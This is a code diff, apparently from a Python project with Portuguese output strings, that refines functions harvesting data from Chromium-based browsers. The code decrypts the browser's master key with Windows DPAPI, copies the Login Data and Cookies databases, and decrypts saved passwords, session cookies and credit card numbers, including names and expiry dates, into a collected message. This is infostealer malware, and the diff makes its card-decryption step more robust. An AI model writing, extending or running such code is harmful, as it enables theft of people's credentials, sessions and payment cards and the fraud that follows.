@@ -149,7 +149,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                         with connect(temp_login.name) as conn:
                             cur = conn.cursor()
                             cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-                            message += f"\n*** {name} - Login ***\n"
+                            message += f"\n {name} - Login \n"
                             for logins in cur.fetchall():
                                 try:
                                     if logins[0] and logins[1] and logins[2]:
@@ -170,7 +170,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                         with connect(temp_cookie.name) as conn:
                             curr = conn.cursor()
                             curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
-                            message += f"\n*** {name} - Cookies ***\n"
+                            message += f"\n {name} - Cookies \n"
                             for cookies in curr.fetchall():
                                 try:
                                     if cookies[0] and cookies[1] and cookies[2] and "google" not in cookies[0]:
@@ -193,30 +193,42 @@ def extrair_cartao_credito(LocalState, LoginData):
     message = ""
     try:
         if os.path.exists(LocalState):
-            with open(LocalState) as f:
+            with open(LocalState, "r") as f:
                 local_state = loads(f.read())
-                master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
+                
+                if not encrypted_key:
+                    raise ValueError("Chave mestra criptografada não encontrada em LocalState.")
+                
+                master_key = b64decode(encrypted_key)[5:]
                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-                with tempfile.NamedTemporaryFile(delete=True) as temp_card:
-                    if os.path.exists(LoginData):
+                if os.path.exists(LoginData):
+                    with tempfile.NamedTemporaryFile(delete=True) as temp_card:
                         copy2(LoginData, temp_card.name)
                         with connect(temp_card.name) as conn:
                             cur = conn.cursor()
                             try:
                                 cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-                                message += "\n*** Cartões de Crédito ***\n"
+                                message += "\nCartões de Crédito\n"
+                                
                                 for card in cur.fetchall():
                                     try:
+                                        
                                         if card[0] and card[1] and card[2] and card[3]:
                                             ciphers = card[3]
-                                            init_vector = ciphers[3:15]
-                                            enc_pass = ciphers[15:-16]
 
-                                            cipher = generate_cipher(master_key, init_vector)
-                                            dec_pass = decrypt_payload(cipher, enc_pass).decode()
-                                            message += f"Nome no Cartão: {card[0]}\nMês Expiração: {card[1]}\nAno Expiração: {card[2]}\nNúmero do Cartão: {dec_pass}\n"
-                                    except Exception as e:
+                                           
+                                            if len(ciphers) >= 16:
+                                                init_vector = ciphers[3:15]
+                                                enc_pass = ciphers[15:-16]
+
+                                                cipher = generate_cipher(master_key, init_vector)
+                                                dec_pass = decrypt_payload(cipher, enc_pass).decode()
+                                                message += f"Nome no Cartão: {card[0]}\nMês Expiração: {card[1]}\nAno Expiração: {card[2]}\nNúmero do Cartão: {dec_pass}\n"
+                                            else:
+                                                print(f"Valor criptografado do cartão é inválido. Tamanho insuficiente.")
+                                    except (ValueError, KeyError, IndexError, sqlite3.Error) as e:
                                         print(f"Erro ao descriptografar cartão de crédito: {e}")
                                         continue
                             except sqlite3.OperationalError as e:
